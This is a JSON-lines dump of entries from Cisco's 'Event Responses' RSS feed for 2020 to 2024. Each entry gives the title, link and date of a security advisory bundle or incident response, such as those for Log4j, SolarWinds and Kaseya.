{"source": "Cisco Event Responses", "title": "Cisco Event Response: October 2024 Cisco ASA, FMC, and FTD Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75300&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20October%202024%20Cisco%20ASA,%20FMC,%20and%20FTD%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2024-10-23 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: Reports of Security Incident", "link": "https://sec.cloudapps.cisco.com/security/center/resources/october_15_2024?vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20Reports%20of%20Security%20Incident%26vs_k=1", "published": "2024-10-16 02:33:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: September 2024 Semiannual Cisco IOS and IOS XE Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75169&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20September%202024%20Semiannual%20Cisco%20IOS%20and%20IOS%20XE%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2024-09-25 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: September 2024 Semiannual Cisco IOS XR Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75416&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20September%202024%20Semiannual%20Cisco%20IOS%20XR%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2024-09-11 23:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: August 2024 Semiannual Cisco FXOS and NX-OS Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75417&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20August%202024%20Semiannual%20Cisco%20FXOS%20and%20NX-OS%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2024-08-28 23:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: May 2024 Cisco ASA, FMC, and FTD Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75298&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20May%202024%20Cisco%20ASA,%20FMC,%20and%20FTD%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2024-05-22 23:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: Attacks Against Cisco Firewall Platforms", "link": "https://sec.cloudapps.cisco.com/security/center/resources/asa_ftd_attacks_event_response?vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20Attacks%20Against%20Cisco%20Firewall%20Platforms%26vs_k=1", "published": "2024-04-24 16:13:30.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: Attacks Against Cisco Firewall Platforms", "link": "https://sec.cloudapps.cisco.com/security/center/resources/asa_ftd_attacks_event_response?vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20Attacks%20Against%20Cisco%20Firewall%20Platforms%26vs_k=1", "published": "2024-04-24 16:12:08.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: March 2024 Semiannual Cisco IOS and IOS XE Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75056&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20March%202024%20Semiannual%20Cisco%20IOS%20and%20IOS%20XE%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2024-03-27 23:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: March 2024 Semiannual Cisco IOS XR Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75299&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20March%202024%20Semiannual%20Cisco%20IOS%20XR%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2024-03-13 23:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: February 2024 Semiannual Cisco FXOS and NX-OS Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75059&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20February%202024%20Semiannual%20Cisco%20FXOS%20and%20NX-OS%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2024-02-29 00:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: November 2023 Cisco ASA, FMC, and FTD Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74985&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20November%202023%20Cisco%20ASA,%20FMC,%20and%20FTD%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2023-11-01 23:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: November 2023 Cisco ASA, FMC, and FTD Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74985&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20November%202023%20Cisco%20ASA,%20FMC,%20and%20FTD%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2023-11-01 16:06:54.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: September 2023 Semiannual Cisco IOS and IOS XE Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74916&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20September%202023%20Semiannual%20Cisco%20IOS%20and%20IOS%20XE%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2023-09-27 23:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: September 2023 Semiannual Cisco IOS XR Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75241&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20September%202023%20Semiannual%20Cisco%20IOS%20XR%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2023-09-13 23:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: August 2023 Semiannual Cisco FXOS and NX-OS Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75058&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20August%202023%20Semiannual%20Cisco%20FXOS%20and%20NX-OS%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2023-08-23 23:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: March 2023 Semiannual Cisco IOS and IOS XE Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74842&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20March%202023%20Semiannual%20Cisco%20IOS%20and%20IOS%20XE%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2023-03-22 23:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: March 2023 Semiannual Cisco IOS XR Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74917&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20March%202023%20Semiannual%20Cisco%20IOS%20XR%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2023-03-09 00:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: February 2023 Semiannual Cisco FXOS and NX-OS Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-75057&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20February%202023%20Semiannual%20Cisco%20FXOS%20and%20NX-OS%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2023-02-23 00:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: November 2022 Semiannual Cisco ASA, FMC, and FTD Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74838&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20November%202022%20Semiannual%20Cisco%20ASA,%20FMC,%20and%20FTD%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2022-11-09 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: September 2022 Semiannual Cisco IOS and IOS XE Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74745&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20September%202022%20Semiannual%20Cisco%20IOS%20and%20IOS%20XE%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2022-10-19 23:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: September 2022 Semiannual Cisco IOS XR Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74840&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20September%202022%20Semiannual%20Cisco%20IOS%20XR%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2022-09-14 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: August 2022 Semiannual Cisco FXOS and NX-OS Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74837&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20August%202022%20Semiannual%20Cisco%20FXOS%20and%20NX-OS%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2022-08-24 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: Corporate Network Security Incident", "link": "https://tools.cisco.com/security/center/resources/corp_network_security_incident?vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20Corporate%20Network%20Security%20Incident%26vs_k=1", "published": "2022-08-10 19:42:21.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: April 2022 Cisco ASA, FMC, and FTD Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74836&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20April%202022%20Cisco%20ASA,%20FMC,%20and%20FTD%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2022-04-27 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: April 2022 Semiannual Cisco IOS and IOS XE Software Security Advisory Bundled Publication", "link": "https://tools.cisco.com/security/center/viewErp.x?alertId=ERP-74561&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20April%202022%20Semiannual%20Cisco%20IOS%20and%20IOS%20XE%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2022-04-13 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: April 2022 Cisco IOS XR Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74835&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20April%202022%20Cisco%20IOS%20XR%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2022-04-13 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: February 2022 Semiannual Cisco FXOS and NX-OS Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74834&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20February%202022%20Semiannual%20Cisco%20FXOS%20and%20NX-OS%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2022-02-23 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: Apache Log4j Java Logging Library Security Incident", "link": "https://tools.cisco.com/security/center/resources/prod_svc_info_log4j.html?vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20Apache%20Log4j%20Java%20Logging%20Library%20Security%20Incident%26vs_k=1", "published": "2021-12-14 14:33:33.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: October 2021 Cisco ASA, FMC, and FTD Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74773&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20October%202021%20Cisco%20ASA,%20FMC,%20and%20FTD%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2021-10-27 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: September 2021 Semiannual Cisco IOS and IOS XE Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74581&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20September%202021%20Semiannual%20Cisco%20IOS%20and%20IOS%20XE%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2021-09-22 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: September  2021 Semiannual Cisco IOS XR  Software Security Advisory Bundled Publication", "link": "http://tools.cisco.com/security/center/viewErp.x?alertId=ERP-74637&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20September%20%202021%20Semiannual%20Cisco%20IOS%20XR%20%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2021-09-08 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: August 2021 Semiannual Cisco FXOS and NX-OS Software Security Advisory Bundled Publication", "link": "https://tools.cisco.com/security/center/viewErp.x?alertId=ERP-74640&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20August%202021%20Semiannual%20Cisco%20FXOS%20and%20NX-OS%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2021-08-25 16:17:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: August 2021 Semiannual Cisco FXOS and NX-OS Software Security Advisory Bundled Publication", "link": "http://tools.cisco.com/security/center/viewErp.x?alertId=ERP-74640&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20August%202021%20Semiannual%20Cisco%20FXOS%20and%20NX-OS%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2021-08-25 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: Kaseya VSA Security Incident", "link": "https://tools.cisco.com/security/center/resources/prod_svc_info_kaseya.html?vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20Kaseya%20VSA%20Security%20Incident%26vs_k=1", "published": "2021-07-04 15:29:28.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: April 2021 Cisco ASA, FMC, and FTD Software Security Advisory Bundled Publication", "link": "https://sec.cloudapps.cisco.com/security/center/viewErp.x?alertId=ERP-74594&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20April%202021%20Cisco%20ASA,%20FMC,%20and%20FTD%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2021-04-28 23:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: March 2021 Semiannual Cisco IOS and IOS XE Software Security Advisory Bundled Publication", "link": "http://tools.cisco.com/security/center/viewErp.x?alertId=ERP-74408&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20March%202021%20Semiannual%20Cisco%20IOS%20and%20IOS%20XE%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2021-03-24 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: February 2021 Cisco FXOS and NX-OS Software Security Advisory Bundled Publication", "link": "http://tools.cisco.com/security/center/viewErp.x?alertId=ERP-74414&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20February%202021%20Cisco%20FXOS%20and%20NX-OS%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2021-02-24 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: SolarWinds Orion Platform Software Attack", "link": "https://tools.cisco.com/security/center/resources/solarwinds_orion_event_response?vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20SolarWinds%20Orion%20Platform%20Software%20Attack%26vs_k=1", "published": "2020-12-17 19:05:46.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: October 2020 Cisco ASA, FMC, and FTD Software Security Advisory Bundled Publication", "link": "http://tools.cisco.com/security/center/viewErp.x?alertId=ERP-74302&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20October%202020%20Cisco%20ASA,%20FMC,%20and%20FTD%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2020-10-21 16:00:00.0", "summary": ""}
{"source": "Cisco Event Responses", "title": "Cisco Event Response: September 2020 Semiannual Cisco IOS and IOS XE Software Security Advisory Bundled Publication", "link": "http://tools.cisco.com/security/center/viewErp.x?alertId=ERP-74268&vs_f=Cisco%20Event%20Responses%26vs_cat=Security%20Intelligence%26vs_type=RSS%26vs_p=Cisco%20Event%20Response:%20September%202020%20Semiannual%20Cisco%20IOS%20and%20IOS%20XE%20Software%20Security%20Advisory%20Bundled%20Publication%26vs_k=1", "published": "2020-09-24 15:55:00.0", "summary": ""}
